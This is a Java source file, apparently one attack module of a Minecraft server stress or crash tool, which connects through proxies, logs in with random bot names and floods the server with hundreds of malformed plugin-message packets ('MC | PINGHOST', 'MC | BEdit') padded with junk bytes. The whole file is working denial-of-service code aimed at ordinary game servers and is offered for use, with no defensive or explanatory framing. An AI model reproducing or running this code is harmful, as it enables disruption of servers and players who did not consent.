package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.LoginRequest;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;

public class ServerFucker implements Method {
   private Handshake handshake;

   public ServerFucker() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
   }

   public static byte[] addAll(byte[] array1, byte... array2) {
      byte[] joinedArray = new byte[array1.length + array2.length];
      System.arraycopy(array1, 0, joinedArray, 0, array1.length);
      System.arraycopy(array2, 0, joinedArray, array1.length, array2.length);
      return joinedArray;
   }

   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
         channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("syveris_" + (new SecureRandom()).nextInt(99999))).getWrappedPacket()));

         for(int i = 0; i < 1900; ++i) {
            out.write(254);
            out.write(47);
            out.writeUTF("MC | PINGHOST");
            out.writeBytes(Main.srvRecord);
            out.write(0);
            out.write(1);
            out.write(254);
            out.write(47);
            out.writeUTF("MC | BEdit");
            out.writeBytes("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
            out.writeByte(254);
            out.writeByte(253);
            out.writeByte(9);
            out.writeByte(0);
            out.writeByte(0);
            out.writeByte(0);
            out.writeByte(1);
         }
      } catch (Exception var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      channel.writeAndFlush(out);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }

   public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
      writeVarInt(packetData.length, out);
      out.write(packetData);
   }

   public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
      while((value & -128) != 0) {
         out.writeByte(value & 127 | 128);
         value >>>= 7;
      }

      out.writeByte(value);
   }
}
